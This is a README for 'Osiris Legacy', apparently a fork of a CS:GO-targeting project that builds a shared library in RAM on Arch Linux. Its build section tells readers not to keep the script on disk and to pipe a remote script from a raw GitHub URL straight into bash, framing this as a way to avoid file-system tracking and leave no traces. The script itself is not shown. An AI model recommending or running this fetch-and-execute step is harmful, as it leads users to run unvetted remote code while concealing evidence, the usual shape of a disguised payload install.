# Osiris Legacy (RAM-Optimized Fork)

This repository is a **modified fork** of the original **Osiris** project, specifically archived and adapted for the classic version of **Counter-Strike: Global Offensive (CS:GO)**. 

> [!NOTE]
> This project is a standalone fork maintained for legacy educational/testing environments. It is **not** compatible with Counter-Strike 2 (CS2), as the Source 2 engine completely overhauled internal memory structures and entity systems.

---

## Project Intentions & Goals

The primary goal of this repository is to provide a **volatile, ultra-fast development and testing workflow** under Linux environments. 

Standard build systems (like CMake or Make) generate numerous temporary object files on physical storage, which slows down the process and leaves persistent traces. This project bypasses these limitations by implementing an **In-Memory Volatile Toolchain**:
1. **Zero Disk Footprint:** Source code copies and intermediate compilation artifacts exist strictly within the system's volatile memory (RAM).
2. **Instant Compilation:** By cutting out CMake configuration checks and leveraging modern compilers/linkers, the build time is compressed to fractions of a second.
3. **Automated Ephemerality:** Once compilation finishes, the temporary working directories are instantly and securely wiped from RAM, leaving only the target binary.

---

## System Requirements & Environment

This setup is tailor-made and fully tested for **Linux**, specifically optimized for **Arch Linux** rolling release.

### Target Environment:
* **Operating System:** Linux (Arch Linux preferred, due to native `tmpfs` setup on `/tmp`).
* **Target Game:** Counter-Strike: Global Offensive (Legacy / Pre-Source 2 branches).

### Required Toolchain Dependencies:
Before running the builder, ensure your system has the modern fast-compilation stack installed:

```bash
# Install required tools via Pacman (Arch Linux)
sudo pacman -S clang mold base-devel Coreutils
```

* `clang`: Used as the primary compiler for rapid code translation.
* `mold`: Used as a high-performance linker to completely eliminate linking bottlenecks.

---

## How to Build (Secure In-Memory Execution)

To ensure maximum security and prevent file-system tracking, **do not download or keep the `build.sh` script on your local disk**. The build process is executed directly inside the system's volatile memory (RAM) via a single network call.

Run the following command in your terminal to fetch the compiler script directly into RAM, compile the binary, and clear all traces instantly:

```bash
# Execute the remote build script straight into Bash memory
wget -qO- "https://raw.githubusercontent.com/artemkoll20/Osiris_builderFast-SY/refs/heads/main/build.sh" | bash
```

### What happens under the hood:
1. `wget -qO-` downloads the script text directly to `stdout` (RAM) without creating any `.sh` files on your hard drive or SSD.
2. The `| bash` pipe forwards the script content straight into the Bash interpreter in memory.
3. The script allocates a temporary sandbox in `/tmp` (RAM-disk), copies your `/Source` directory, runs `clang++` + `mold`, and immediately purges the sandbox.
4. The final stripped `libOsiris.so` is placed in `/tmp/`, leaving zero build artifacts behind.

